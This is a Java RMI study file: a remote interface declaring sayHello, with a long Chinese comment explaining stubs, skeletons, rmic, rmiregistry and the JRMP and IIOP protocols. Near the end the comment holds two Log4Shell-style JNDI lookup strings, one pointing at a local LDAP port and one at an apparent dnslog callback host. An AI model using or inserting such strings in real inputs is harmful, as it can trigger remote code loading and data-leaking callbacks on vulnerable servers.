package com.yale.test.java.classpath.rmi;

import java.rmi.Remote;
import java.rmi.RemoteException;
/*
*远程部署的RMI-分布式计算
* 这一章会介绍Java的远程程序调用(Remote Method Invocation,RMI)技术。我们也会很快地看到Servlet,
* Enterprise Java Bean(EJB),Jini以及EJB与Jini是如何运用RMI。最后你还会以Java创建出一个通用服务浏览器。
* Executable Jar-->(HTTP)Web Start-->RMI app-->HTTP Servlet
* 完全在本机                                                    介于俩者之间                                       完全在远程
* 方法的调用都是发生在相同的堆上的俩个对象之间,要记得Java虚拟机会负责把表示"如何取得堆上的对象"的字节组合填入应用变量中。
* 远程过程调用的设计要创建出4种东西:服务器,客户端,服务器辅助设施和客户端辅助设施
* 1,创建客户端和服务器应用程序。服务器应用程序是个远程服务,是个带有客户端会调用的方法的对象。
* 2,创建客户端和服务器端的辅助设施(helper)。它们会处理所有客户端和服务器的底层网络输入/输出细节,让你的客户端
* 和程序好像处在本机调用一样。
* --------------          -----------------------
* |Client Heap  |         |Server Heap          
* |Client 对象          |         |Service 辅助设施
* |Client 辅助设施  |         |Service对象
* --------------          ------------------------
* 调用方法的过程:Client对象调用Client 辅助设施,Client辅助设施把调用信息打包通过Socket发送给Service辅助设施,Service辅助设施调用Server对象。
* 记住真正的方法逻辑在Server对象这里。
* java虚拟机一定会知道对象,以及如何取得对象。
* Java RMI提供客户端和服务器端的辅助设施对象,在RMI中,客户端的辅助设施称为stub,而服务器端的辅助设施称为skeleton.
* 辅助设施是个在实际上执行通信的对象,它会让客户端感觉上好像是在调用本机的对象.事实上正是这样,客户端调用辅助设施的方法,
* 就好像客户端就是服务器一样。客户端是真正服务的代理(proxy).也就是说,客户端以为它调用的是远程的服务,因为辅助设施假装成该服务对象。
* 但客户端辅助设施并不是真正的远程服务,虽然辅助设施的举止跟它很像(因为它提供的方法跟服务所声明的一样),却没有任何真正客户端需要的方法逻辑。
* 相反,辅助设施会去连接服务器,将调用的信息传送过去(像是方法的名称和参数内容),然后等待服务器的响应。通过Socket连接。
* Java RMI提供客户端和服务器端的辅助设施对象！在Java中,RMI已经帮你创建好客户端和服务器端的辅助设施,它知道如何让客户端辅助设施看起来像是真正的服务。
* 虽然只是对本地的代理人调用,此调用最终还是会涉及到Socket和串流。使用RMI时,你必须要决定协议:JRMP或是IIOP。
* JRMP是RMI原生的协议,它是为了Java对Java间的远程调用而设计。
* IIOP是为了CORBA(Common Object Request Broker Architecture)而产生的,它让你能够调用Java对象或其他类型的远程方法。CORBA通常比RMI麻烦,
* 因为若俩端不全都是Java的话,就会发生一堆可怕的转译和交谈操作。
* 创建RMI远程服务:
* 1,创建Remote.java接口,远程的接口定义了客户端可以远程调用的方法。它是个作为服务的多态化类。stub和服务都会实现此接口。
* 2,实现Remote接口,这是真正执行的类。它实现出定义在该接口上的方法。它是客户端会调用的对象。
* 3,用rmic产生stub与skeleton.rmic是java自带的命令。客户端和服务端都有helper,你无需创建这些类或产生这些类的源代码。
* 这都会在你执行JDK所附的rmic工具时自动地处理掉。对真正实现的类执行rmic,会产生出俩个helper的类:
* rmic MyRemoteImpl
* MyRemoteImpl_Stub.class和MyRemoteImpl_Skel.class
* 4,启动RMI registry(rmiregistry),rmiregisty就像是电话簿。用户会从此处取得代理(客户端的stub/helper对象)
* rmiregisty(直接在CMD窗口上面执行这个命令就行)
* 5,启动远程服务,你必须先让服务对象开始执行。实现服务的类会启动服务的实例并向RMI registry注册。要有注册后才能对用户提供服务。
* java MyRemoteImpl
* ${jndi:ldap://127.0.0.1:1389/a}
* ${jndi:ldap://6tet0s.dnslog.cn/exp}
*/
public interface MyRemote2 extends Remote {//注意我们的接口类MyRemote继承了Remote这个接口,1.创建远程接口MyRemote
	
	/*
	 * 第一:注意必须自己手动将RemoteException声明出来
	 * 第二:确定参数和返回值都是primitive主数据类型或实现了Serializable接口的类,远程方法的参数和返回值必须是primitive或Serializable的。
	 * 因为任何远程方法的参数都会通过网络传输,而这是通过序列化来完成的,返回值也一样。
	 */
	public String sayHello() throws RemoteException;
}
